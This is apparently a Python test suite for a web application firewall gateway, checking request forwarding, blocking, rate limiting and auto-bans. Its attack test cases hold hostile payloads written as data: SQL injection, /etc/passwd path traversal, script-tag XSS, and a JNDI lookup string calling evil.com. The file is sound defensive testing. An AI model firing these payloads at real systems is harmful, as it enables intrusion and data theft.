"""Gateway tests: a real stub backend runs on a local socket and the gateway forwards to it.
Uses a temporary database; never touches your real logs. Run:  python tests/test_gateway.py"""
import json
import os
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
_tmp = tempfile.mkdtemp()
from src.hybrid_waf.utils import event_store  # noqa: E402
event_store.DB_PATH = type(event_store.DB_PATH)(os.path.join(_tmp, "gw.db"))
from src.hybrid_waf.gateway import create_gateway_app  # noqa: E402
from src.hybrid_waf.utils.traffic_control import get_controller  # noqa: E402


class Backend(BaseHTTPRequestHandler):
    hits = []

    def _any(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        Backend.hits.append({"method": self.command, "path": self.path,
                             "headers": {k.lower(): v for k, v in self.headers.items()}, "body": body})
        if self.path.startswith("/redirect"):
            self.send_response(302); self.send_header("Location", f"http://{self.headers['Host']}/target")
            self.send_header("Content-Length", "0"); self.end_headers(); return
        if self.path.startswith("/cookies"):
            self.send_response(200); self.send_header("Set-Cookie", "a=1"); self.send_header("Set-Cookie", "b=2")
            self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok"); return
        if self.path.startswith("/slow"):
            time.sleep(2)
        out = json.dumps({"ok": True}).encode()
        self.send_response(201 if self.command == "POST" else 200)
        self.send_header("Content-Type", "application/json"); self.send_header("X-Backend", "yes")
        self.send_header("Content-Length", str(len(out))); self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(out)

    do_GET = do_POST = do_PUT = do_DELETE = do_HEAD = _any

    def log_message(self, *a):
        pass


srv = ThreadingHTTPServer(("127.0.0.1", 0), Backend)
threading.Thread(target=srv.serve_forever, daemon=True).start()
BACKEND = f"http://127.0.0.1:{srv.server_address[1]}"

ML = {"answer": False}
app = create_gateway_app(ml_predict=lambda path, query, body: ML["answer"])
app.config["TESTING"] = True
ctl = get_controller()
ATTACK_IP = "203.0.113.50"


def setup(**over):
    """Fresh state for each test."""
    ctl._bans.clear(); ctl._attacks.clear(); ctl._requests.clear(); ctl._last_logged.clear()
    ctl.cfg["proxy"].update(backend_url=BACKEND, mode="block", max_body_bytes=131072,
                            timeout_seconds=10, ml_on_obfuscated=True, log_allowed=True)
    ctl.cfg["proxy"].update(over)
    ctl.cfg["proxy_rate_limit"].update(max_requests=300, window_seconds=60)
    ML["answer"] = False
    Backend.hits.clear()
    return app.test_client()


def go(c, method="GET", url="/", ip="198.51.100.7", **kw):
    return getattr(c, method.lower())(url, environ_overrides={"REMOTE_ADDR": ip}, **kw)


def test_forwards_clean_requests_faithfully():
    c = setup()
    r = go(c, url="/products/7?color=red&page=2", headers={"X-Custom": "hello", "X-Forwarded-For": "6.6.6.6",
                                                         "Keep-Alive": "300"})
    assert r.status_code == 200 and r.headers["X-Backend"] == "yes" and r.json == {"ok": True}
    h = Backend.hits[0]
    assert h["path"] == "/products/7?color=red&page=2"
    assert h["headers"]["x-custom"] == "hello"
    assert h["headers"]["x-forwarded-for"] == "198.51.100.7"          # forged header replaced, not trusted
    assert h["headers"]["host"] == BACKEND.replace("http://", "")
    assert "keep-alive" not in h["headers"]


def test_post_body_and_status_pass_through():
    c = setup()
    payload = json.dumps({"productId": "12345", "quantity": 1, "color": "#fff",
                          "note": "run `npm install` then start"})
    r = go(c, "POST", "/cart/add", data=payload, content_type="application/json")
    assert r.status_code == 201 and Backend.hits[0]["body"] == payload.encode()


def test_redirect_location_and_multiple_cookies():
    c = setup()
    r = go(c, url="/redirect")
    assert r.status_code == 302 and r.headers["Location"] == "http://localhost/target"   # rewritten to gateway host
    r = go(c, url="/cookies")
    assert sorted(r.headers.getlist("Set-Cookie")) == ["a=1", "b=2"]


def test_attacks_blocked_in_every_location():
    cases = {
        "query": dict(url="/search?q=' OR '1'='1'--"),
        "path": dict(url="/files/../../etc/passwd"),
        "body": dict(method="POST", url="/comment", data="text=<script>alert(1)</script>",
                     content_type="application/x-www-form-urlencoded"),
        "header:User-Agent": dict(url="/", headers={"User-Agent": "${jndi:ldap://evil.com/a}"}),
    }
    for location, kw in cases.items():
        c = setup()
        r = go(c, ip=ATTACK_IP, **kw)
        assert r.status_code == 403, (location, r.status_code)
        assert not Backend.hits, f"attack reached the backend via {location}"
        row = event_store.get_events(1)[0]
        assert row["action"] == "blocked" and row["payload"].startswith(f"[{location}]"), (location, row)


def test_cookie_attack_blocked_over_a_real_socket():
    """Werkzeug's test client discards Cookie headers, so this one uses a real connection."""
    import http.client
    from werkzeug.serving import make_server
    setup()
    gw = make_server("127.0.0.1", 0, app, threaded=True)
    threading.Thread(target=gw.serve_forever, daemon=True).start()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", gw.server_address[1], timeout=5)
        conn.request("GET", "/", headers={"Cookie": "session=1' UNION SELECT password FROM users--"})
        r = conn.getresponse(); r.read()
        assert r.status == 403 and not Backend.hits
        assert event_store.get_events(1)[0]["payload"].startswith("[cookie]")
        conn = http.client.HTTPConnection("127.0.0.1", gw.server_address[1], timeout=5)
        conn.request("GET", "/", headers={"Cookie": "session=abc123; theme=dark"})
        r = conn.getresponse(); r.read()
        assert r.status == 200 and Backend.hits[0]["headers"]["cookie"] == "session=abc123; theme=dark"
    finally:
        gw.shutdown()


def test_encoded_attack_caught_by_decoding():
    c = setup()
    r = go(c, url="/search?q=%27%20OR%20%271%27%3D%271", ip=ATTACK_IP)
    assert r.status_code == 403 and not Backend.hits
    assert event_store.get_events(1)[0]["detected_by"] == "signature(decoded)"


def test_ml_second_opinion_for_unrecognised_encoded_input():
    c = setup()
    assert go(c, url="/search?q=hello%20world").status_code == 200      # encoded but harmless
    ML["answer"] = True
    assert go(c, url="/search?q=hello%20world", ip=ATTACK_IP).status_code == 403
    assert event_store.get_events(1)[0]["detected_by"] == "ml"
    setup(ml_on_obfuscated=False); ML["answer"] = True
    assert go(c, url="/search?q=hello%20world").status_code == 200       # ML switched off


def test_padding_cannot_hide_an_attack():
    c = setup()
    body = "x=" + "a" * 20000 + "&y=1' OR '1'='1"
    assert go(c, "POST", "/f", data=body, ip=ATTACK_IP, content_type="application/x-www-form-urlencoded").status_code == 403


def test_oversized_body_rejected():
    c = setup(max_body_bytes=1000)
    r = go(c, "POST", "/upload", data="a" * 5000)
    assert r.status_code == 413 and not Backend.hits
    assert event_store.get_events(1)[0]["rule_id"] == "SIZE-001"


def test_detect_mode_logs_but_forwards():
    c = setup(mode="detect")
    r = go(c, url="/search?q=<script>alert(1)</script>", ip=ATTACK_IP)
    assert r.status_code == 200 and len(Backend.hits) == 1
    assert event_store.get_events(1)[0]["action"] == "detected"
    assert not ctl.active_bans()


def test_backend_down_and_timeout():
    c = setup(backend_url="http://127.0.0.1:1")
    assert go(c, url="/").status_code == 502
    c = setup(timeout_seconds=1)
    assert go(c, url="/slow").status_code == 504


def test_block_page_never_reflects_the_payload():
    c = setup()
    r = go(c, url="/search?q=<script>alert('XSS-MARKER')</script>", ip=ATTACK_IP)
    assert r.status_code == 403 and b"XSS-MARKER" not in r.data and b"<script>" not in r.data


def test_auto_ban_and_proxy_rate_limit():
    c = setup()
    for _ in range(5):
        go(c, url="/search?q=<script>x</script>", ip="203.0.113.9")
    r = go(c, url="/", ip="203.0.113.9")                                  # harmless, but IP is banned now
    assert r.status_code == 403 and b"banned" in r.data and not Backend.hits
    c = setup(); ctl.cfg["proxy_rate_limit"]["max_requests"] = 5
    codes = [go(c, url="/", ip="203.0.113.77").status_code for _ in range(7)]
    assert codes == [200] * 5 + [429, 429]
    ctl.cfg["proxy_rate_limit"]["max_requests"] = 300


def test_allowed_requests_logged_but_static_assets_skipped():
    c = setup()
    go(c, url="/products?id=3"); go(c, url="/static/app.css")
    rows = event_store.get_events(5)
    assert any(r["action"] == "allowed" and r["path"] == "/products" for r in rows)
    assert not any(r["path"].endswith(".css") for r in rows)


def test_other_methods():
    c = setup()
    for m in ("PUT", "DELETE", "HEAD"):
        assert go(c, m, "/thing/1").status_code in (200, 201), m
    assert [h["method"] for h in Backend.hits] == ["PUT", "DELETE", "HEAD"]


if __name__ == "__main__":
    fails = 0
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            try:
                fn(); print("PASS", name)
            except Exception as e:
                fails += 1; print("FAIL", name, type(e).__name__, e)
    sys.exit(1 if fails else 0)
